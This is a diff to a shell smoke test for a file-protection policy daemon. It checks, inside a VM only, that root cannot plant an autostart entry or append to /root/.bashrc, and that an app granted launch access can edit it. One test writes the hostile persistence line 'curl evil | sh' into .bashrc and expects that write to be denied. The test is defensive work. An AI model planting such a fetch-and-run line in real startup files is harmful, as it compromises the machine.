@@ -207,6 +207,42 @@ else
 fi
 
 kill -INT "$daemon"; wait "$daemon"
+
+# --- launch_files ---------------------------------------------------------------
+# Root's own startup files, with the root bypass off: only in a VM.
+step "launch_files"
+if [[ ${SMOKE_IN_VM:-0} == 1 ]]; then
+    mkdir -p /root/.config/autostart
+    [[ -e /root/.bashrc ]] || echo '# .bashrc' > /root/.bashrc
+    cp "$(type -P bash)" "$B/editor"
+    printf '%s\n' "users root" "root_bypass off" "launch_files enforce" \
+        "app editor { exe \"$B/editor\" }" "grant editor all to @launch" > "$DIR/launch.explsm"
+    : > "$ERR"
+    "$EXPLSMD" --policy "$DIR/launch.explsm" --no-dbus --no-pin --no-self-protect >> "$OUT" 2> "$ERR" &
+    daemon=$!
+    for _ in $(seq $((100 * ${SMOKE_SLOW:-1}))); do grep -q attached "$ERR" && break; sleep 0.1; done
+    grep -q "+ root /root/.bashrc .* of launch" "$ERR"
+    check "the launch files are protected" $? "$(grep -E 'launch|attached' "$ERR")"
+
+    run sh -c "echo x > /root/.config/autostart/evil.desktop"
+    [[ $rc -ne 0 && ! -e /root/.config/autostart/evil.desktop ]] &&
+        has "deny .* owner=launch create need=create /root/.config/autostart/evil.desktop"
+    check "root can't plant an autostart entry" $? "rc=$rc out=$out $ev"
+
+    run sh -c "echo 'curl evil | sh' >> /root/.bashrc"
+    [[ $rc -ne 0 ]] && ! grep -q evil /root/.bashrc
+    check "root can't append to .bashrc" $? "rc=$rc out=$out $ev"
+
+    run cat /root/.bashrc
+    check "anyone reads .bashrc" $rc "rc=$rc out=$out $ev"
+
+    run "$B/editor" -c "echo '# edited' >> /root/.bashrc"
+    [[ $rc -eq 0 ]] && grep -q '# edited' /root/.bashrc
+    check "an app granted @launch edits it" $? "rc=$rc out=$out $ev"
+    kill -INT "$daemon"; wait "$daemon"
+else
+    skip "launch_files" "changes root's own files; runs in a VM only (tests/run-all.sh)"
+fi
 echo
 [[ $fails -eq 0 ]] && echo "all checks passed" || echo "$fails checks FAILED"
 exit $((fails > 0))
